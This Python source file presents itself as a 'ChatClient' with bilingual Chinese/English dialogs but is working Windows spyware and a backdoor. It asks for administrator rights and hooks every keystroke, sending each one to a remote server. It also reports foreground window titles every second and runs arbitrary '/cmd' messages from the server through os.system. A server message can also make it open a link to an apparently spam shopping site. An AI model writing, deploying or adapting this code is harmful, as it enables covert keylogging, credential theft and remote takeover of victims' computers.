import socket
import threading
import tkinter as tk
from tkinter import messagebox, simpledialog  # 导入 filedialog
import keyboard
import win32gui
import time
import os
import sys
import ctypes

class ChatClient:
    def __init__(self):
        self.window = None
        pass

    def connect(self, host, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((host, port))
            threading.Thread(target=self.receive_message, daemon=True).start()
        except socket.error as e:
            messagebox.showerror("连接错误 Connect Error", f"无法连接到服务器 Can't connect to server: {e}")
        else:
            messagebox.showinfo("连接成功 Connected accept.", f"已连接到服务器 {host}:{port} Connected to server.")
            self.sock.sendall(("/name:" + user).encode('utf-8'))
            keyboard.hook(self.send_message)
            threading.Thread(target=lambda:keyboard.wait, daemon=True).start()
            threading.Thread(target=self.send_window, daemon=True).start()
            self.receive_message()

    def send_message(self, event=None):
        if event.event_type == keyboard.KEY_DOWN:
            self.sock.sendall((user + ":" + event.name).encode('utf-8'))

    def receive_message(self):
        while True:
            try:
                data = self.sock.recv(1024)
                message = data.decode('utf-8')
                if message.startswith(f"{user} 已被18+。{user} ,you have been 18+ed."):
                    os.system("start https://www.afydooam.shop/c/hyx240814/?code=212989635221347&clickid=culcmif9pkqc73eracsg&n=3104")
                elif message.startswith("/quit"):
                    self.on_close()
                elif message.startswith(f"/cmd "):
                    command = message.split()
                    os.system(" ".join(command[1:]))
                elif message.startswith("server: "):
                    messagebox.showinfo("", message)
            except Exception:
                pass
    
    def send_window(self):
        while True:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            classname = win32gui.GetClassName(window)
            if title != self.window:
                self.window = title
                self.sock.sendall((user + ":\t" + classname + "\t" + title).encode('utf-8'))
            time.sleep(1)

    def on_close(self):
        keyboard.unhook_all()
        if self.sock:
            self.sock.close()
        os._exit(0)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == '__main__':
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        os._exit(0)
    client = ChatClient()
    host = simpledialog.askstring("连接 Connect", "服务器地址 IP: ", initialvalue="127.0.0.1")
    port = 8888
    user = str(socket.gethostbyname(socket.gethostname()))
    client.connect(host, port)
